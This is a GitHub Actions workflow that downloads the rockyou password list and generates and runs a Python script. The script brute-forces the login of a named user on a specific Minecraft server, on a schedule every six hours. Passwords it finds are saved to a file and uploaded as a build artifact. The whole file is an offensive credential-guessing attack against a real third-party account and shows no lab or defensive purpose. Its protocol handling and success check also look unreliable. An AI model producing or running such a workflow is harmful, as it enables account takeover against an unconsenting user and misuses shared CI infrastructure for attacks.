name: Cargq Cracker

# Trigger manually or via schedule
on:
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *' 

jobs:
  crack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Download wordlist
        run: |
          wget https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz
          gunzip rockyou.txt.gz

      - name: Run Script
        env:
          MC_IP: nyvexsmp.playwithbao.com
          LOGIN_TARGET: cargq
        run: |
          cat > brute.py << 'EOF'
          import socket
          import threading
          import time
          import struct
          import os

          MC_IP = "nyvexsmp.playwithbao.com"
          MC_PORT = 25565
          USERNAME = "cargq"
          WORDLIST_FILE = "rockyou.txt"
          OUTPUT_FILE = "cracked_passwords.txt"

          failures = 0
          server_socket = None

          def load_wordlist():
              print(f"[*] Loading wordlist...")
              try:
                  with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
                      return [line.strip() for line in f if line.strip()]
              except FileNotFoundError:
                  print("[-] Wordlist not found.")
                  return []

          def connect():
              global server_socket
              try:
                  server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  server_socket.settimeout(5)
                  server_socket.connect((MC_IP, MC_PORT))
                  print("[+] Connected!")
                  return True
              except:
                  return False

          def send_login(username, password):
              try:
                  u_bytes = username.encode('utf-8')
                  length = len(password)
                  payload = struct.pack('>I', (2 << 24) | len(u_bytes) + len(password)) + b'\x02' + u_bytes + password.encode('utf-8')
                  server_socket.send(payload)
              except Exception as e:
                  pass

          def worker(wordlist):
              u_bytes = USERNAME.encode('utf-8')
              data = struct.pack('>I', (2 << 24) | len(u_bytes)) + b'\x02' + u_bytes
              server_socket.send(data)
              time.sleep(2)

              for pwd in wordlist:
                  send_login(USERNAME, pwd)
                  start = time.time()
                  while time.time() - start < 0.5:
                      try:
                          response = server_socket.recv(1024).decode('utf-8')
                          if response:
                              print(f"\n[!] SUCCESS: {USERNAME} / {pwd}")
                              with open(OUTPUT_FILE, 'a') as f:
                                  f.write(f"{USERNAME}:{pwd}\n")
                              return
                      except:
                          break
                  time.sleep(0.01)

          def main():
              wordlist = load_wordlist()
              if not connect():
                  return

              t = threading.Thread(target=worker, args=(wordlist,))
              t.start()
              t.join()

          if __name__ == "__main__":
              if os.path.exists(WORDLIST_FILE):
                  main()
          EOF

          chmod +x brute.py
          python3 brute.py

      - name: Upload Passwords
        uses: actions/upload-artifact@v4
        with:
          name: passwords
          path: cracked_passwords.txt
          
